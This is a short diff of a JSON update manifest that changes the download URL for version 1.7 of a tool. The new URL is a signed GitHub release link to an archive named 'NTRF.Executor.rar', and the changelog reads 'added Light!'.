@@ -1,6 +1,6 @@
 {
     "SoftwareVersion": "1.7",
-    "SoftwareUrl":"https://weak-wide-odometer.glitch.me/",
+    "SoftwareUrl":"https://objects.githubusercontent.com/github-production-release-asset-2e65be/971601939/09815f4d-d4d3-4948-adcd-ea8612d3cbd0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250618%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250618T231714Z&X-Amz-Expires=300&X-Amz-Signature=2d66a0ea1b7b63cd209c721c8d0367051497123db0be62cc343216954fecfefe&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DNTRF.Executor.rar&response-content-type=application%2Foctet-stream",
     "Status":"True",
     "Changelog":"[+] added Light!"
 }
